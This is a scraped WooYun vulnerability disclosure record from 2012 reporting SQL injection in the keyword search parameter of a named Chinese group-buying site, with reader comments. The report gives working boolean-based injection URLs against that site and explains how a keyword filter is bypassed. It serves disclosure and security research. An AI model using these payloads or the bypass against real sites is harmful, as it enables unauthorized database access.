{"id": 20668, "wybug_id": "wooyun-2012-05050", "wybug_title": "天天团购网SQL注射", "wybug_corp": "天天团购网", "wybug_author": "冷冷的夜", "wybug_date": "2012-03-06 10:05", "wybug_open_date": "2012-04-20 10:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-04-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT,话说怎么好多网站都叫天天团购，研究了半天，最终还是没搞明白，o(︶︿︶)o  详细说明：  其实这个貌似对参数进行了过滤，and,-等关键字都已经被限制，但是，过滤不严格导致了问题：or,select ,',=,<,>等管关键字未被过滤先找个不从在的关键字http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq返回空http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq'+or%20'1'='依然返回空http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq'+or%20'%'='返回数据由此推断后台sql语句可能类似这样的写法 select * from xxx where keyword like '%str%'，然后我们再来试试http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq'+or%200%3E0+or%20'1'='返回空 or 0>0以及最后的or '1'='%也为false，所以返回空http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq'+or%201%3E0+or%20'1'='返回数据 因为or 1>0成立http://www.tiantiantuangou.com/team/index.php?filter=true&keyword=qqqq'+or%20(select%201)%3E0+or%20'1'=' 返回数据，说明 (select 1)>0成立，select查询成功   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  你懂得   版权声明：转载请注明来源 冷冷的夜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-03-06 15:08 |    \t\t杭州神话(乌云厂商)\t\t \n  @冷冷的夜 请问是天天团购程序（tttuangou.net），还是针对某名字叫天天团购的网站，还望明确下，以便我们厂商认领    \n     2012-03-06 15:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  是团购网 ；）    \n     2012-03-06 18:28 |    \t\t杭州神话(乌云厂商)\t\t \n  @xsser 那这个应该不属于我们家的认领范围了，希望正主能早点作出回应    \n     2012-03-06 18:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @杭州神话 嗯 记得有问题在补丁里给个来源吧 谢谢    \n     2012-03-06 19:03 |    \t\t杭州神话(乌云厂商)\t\t \n  @xsser 嗯，已经通知了技术部在发布新的补丁的说明时候加入漏洞反馈来源    \n     2012-03-07 09:18 |    \t\tteamtopkarl \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:7        | 对网络安全事业一直保持着激情)\t\t \n  还有某团购网，全国遍布的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}